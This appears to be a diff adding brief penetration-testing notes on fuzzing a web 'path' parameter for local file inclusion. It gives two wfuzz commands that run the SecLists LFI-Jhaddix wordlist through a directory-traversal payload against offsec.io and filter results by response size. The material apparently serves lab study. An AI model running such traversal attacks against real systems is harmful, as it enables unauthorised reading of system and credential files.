@@ -1,0 +1,16 @@
+Fuzzing the path parameter
+
+
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt https://offsec.io/relevantpath?path=../../../../../../FUZZ
+
+for dual param fuzz FUZ2Z
+
+
+now filterout with --hh option:
+
+look at 81Ch (txt)
+
+
+now add the Ch value just --hh 
+
+wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hc 404 --hh 81,125 https://offsec.io/relevantpath?path=../../../../../../FUZZ
